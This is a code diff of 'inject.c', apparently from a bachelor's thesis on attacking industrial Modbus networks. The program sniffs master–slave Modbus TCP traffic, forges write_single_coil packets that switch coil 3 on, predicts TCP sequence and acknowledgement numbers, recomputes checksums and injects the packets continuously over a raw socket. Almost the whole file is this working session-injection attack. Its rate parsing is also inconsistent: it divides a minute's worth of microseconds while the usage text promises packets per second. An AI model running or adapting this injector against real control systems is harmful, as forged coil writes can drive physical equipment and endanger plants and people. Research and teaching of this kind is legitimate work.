@@ -1,12 +1,15 @@
 // Solution for BACHELOR’S THESIS: atack generation on industrial modbus network
 // File:        inject.c
 // Author:      Jakub Kuzník, FIT
-// Program will ...
+// Program sniffs tcp comunication between master and slave. It injects packets
+//     into this communication. Communication we are looking for is defined in 
+//     modbus-packet.h
+// Execution: ./inject 10 .... means 10 packets/s 
+//            ./inject 0  .... means full speed 
 
 #include "inject.h"
 
-int main(void)
-{
+int main(int argc, char **argv){
 
   // Modbus TCP packet
   modbusPacket *mPacket;
@@ -15,9 +18,11 @@ int main(void)
   int rawSocket;
   pcap_t *sniffInterface = NULL;
   char error_message[PCAP_ERRBUF_SIZE];
-
   srand(time(NULL)); // rand nums init.
 
+  // count how many mili second should we wait between each injected packet 
+  uint64_t waitMicroSec = parseArgs(argc, argv);
+  
   // this function will create raw socket.
   // if there is an error it will exit() program
   rawSocket = createRawSocket();
@@ -28,8 +33,7 @@ int main(void)
 
   // find packet and parse all its info
   // TODO can send every nth (slow it down)
-  while (1)
-  {
+  while (1){
     mPacket = findModbusPacket();
 
     // generate malicious packet (predict seq, ack nums) from existing
@@ -44,25 +48,19 @@ int main(void)
     // // count the crc
     // uint32_t crc = crc32(0L, Z_NULL, 0); // initialize CRC value
     // crc = crc32(crc, (const Bytef *)packetRawForm, packet_size);
-    // printf("CRC: %u\n",crc);
-
     // // Append the CRC to the packet data
     // memcpy(packetRawForm + packet_size, &crc, sizeof(crc));
     // packet_size += sizeof(crc);
 
-    printf("len: %d\n", packet_size);
     //// debug packet raw data
-    for (int i = 0; i < packet_size; i++)
-    {
+    for (int i = 0; i < packet_size; i++){
       printf(" %02hhX", packetRawForm[i]);
     }
     printf("\n");
-    // packet is ack aswell
-    // usleep(50000);
+    usleep(waitMicroSec);
 
     // send the data over the raw socket
     write(rawSocket, packetRawForm, packet_size);
-    printf(".");
     free(packetRawForm);
     free(mPacket->modbusP.data);
     free(mPacket);
@@ -76,9 +74,7 @@ int main(void)
 /**
  * @brief Create malicious packet from existing.
  */
-void generateMaliciousPacket(modbusPacket *mPacket)
-{
-
+void generateMaliciousPacket(modbusPacket *mPacket){
   // ref number -> 3
   // activate -> data -> FF
   // ack = ack + 48 == 4 write_single_coil packets
@@ -90,14 +86,9 @@ void generateMaliciousPacket(modbusPacket *mPacket)
   // ref num 3
   mPacket->modbusP.data[0] = 0;
   mPacket->modbusP.data[1] = 3;
-  // mPacket->modbusP.data[1] = rand() % 4;
 
   // activate data
   mPacket->modbusP.data[2] = 0xff;
-  // if (rand() % 2 == 0)
-  // mPacket->modbusP.data[2] = 0xff;
-  // else
-  // mPacket->modbusP.data[2] = 0x00;
 
   mPacket->ipHeader.id = random();
   countIpChecksum(mPacket);
@@ -106,7 +97,6 @@ void generateMaliciousPacket(modbusPacket *mPacket)
   mPacket->tcpHeader.ack_seq = htonl(ntohl(mPacket->tcpHeader.ack_seq) + 48);
   mPacket->tcpHeader.check = 0;
   countTcpChecksum(mPacket);
-  // mPacket->ipHeader.check = 0;
 }
 
 /**
@@ -114,8 +104,7 @@ void generateMaliciousPacket(modbusPacket *mPacket)
  */
 void countIpChecksum(modbusPacket *mPacket)
 {
-
-  // checksum field is nout counted
+  // checksum field is not in calculation 
   mPacket->ipHeader.check = 0;
 
   uint32_t result = 0;
@@ -148,10 +137,9 @@ void countTcpChecksum(modbusPacket *mPacket)
   uint16_t *data = prepareDataForChecksum(mPacket); // ip_pseudo:tcp_header:payload
   int dataLen = tcpLen + PH_SIZE;
 
-  for (int i = 0; i < dataLen; i++)
-    printf("%02x ", data[i]);
-  printf("\n");
-
+  // for (int i = 0; i < dataLen; i++)
+    // printf("%02x ", data[i]);
+  // printf("\n");
 
   // Calculate the TCP checksum 
   uint32_t sum = 0;
@@ -166,20 +154,16 @@ void countTcpChecksum(modbusPacket *mPacket)
 
   sum =  (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
-
   sum = (uint16_t)(~sum);
 
   mPacket->tcpHeader.check = htons(sum);
-  printf("checksum : %d\n",sum);
-  printf("Nchecksum: %d\n",htons(sum));
   free(data);
 }
 
 /**
  * @brief concatenate pseudo header tcp header and payload
  */
-char *prepareDataForChecksum(modbusPacket *mPacket)
-{
+char *prepareDataForChecksum(modbusPacket *mPacket){
 
   int tcpLen = ntohs(mPacket->ipHeader.tot_len) - IP_HEADER_SIZE;
   char *data = malloc(PH_SIZE + tcpLen);
@@ -243,4 +227,37 @@ int createRawSocket()
   }
 
   return rawSocket;
+}
+
+/**
+ * @brief Parse arguments. It count how many micro sec should we 
+ *   wait between each packet 
+ */
+uint64_t parseArgs(int argc, char **argv){
+
+  if (argc != 2){
+    // Execution: ./inject 10 .... means 10 packets/s 
+    //            ./inject 0  .... means full speed 
+    fprintf(stderr, "Bad execution.\n");
+    fprintf(stderr, "try:\n");
+    fprintf(stderr, " ./inject 10 ... means 10 packets/s.\n");
+    fprintf(stderr, " ./inject 0  ... means full speed.\n");
+    exit(1);
+  }
+  
+  char *endptr;
+  uint64_t packetsPS = strtoull(argv[1], &endptr, 10);
+  if (*endptr){
+    fprintf(stderr, "argument not an number\n");
+    exit(1);
+  }
+
+  // full speed 
+  if (packetsPS == 0)
+    return 0; 
+
+  // 1min / packetsPS 
+  return (uint64_t) (60000000 / packetsPS);
+  
+
 }
